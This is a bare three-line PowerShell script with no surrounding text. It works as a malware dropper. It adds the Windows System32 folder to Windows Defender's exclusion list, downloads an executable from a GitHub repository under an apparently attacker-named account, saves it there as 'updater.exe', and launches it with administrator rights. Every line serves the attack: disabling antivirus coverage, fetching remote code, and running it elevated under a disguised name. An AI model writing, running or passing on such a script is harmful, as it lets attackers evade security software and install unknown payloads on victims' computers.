Add-MpPreference -ExclusionPath "$env:windir\System32"
Invoke-WebRequest "https://github.com/Ambatukamhacker/l23/raw/main/c.exe" -OutFile "$env:windir\System32\updater.exe"
Start-Process "$env:windir\System32\updater.exe" -Verb runAs
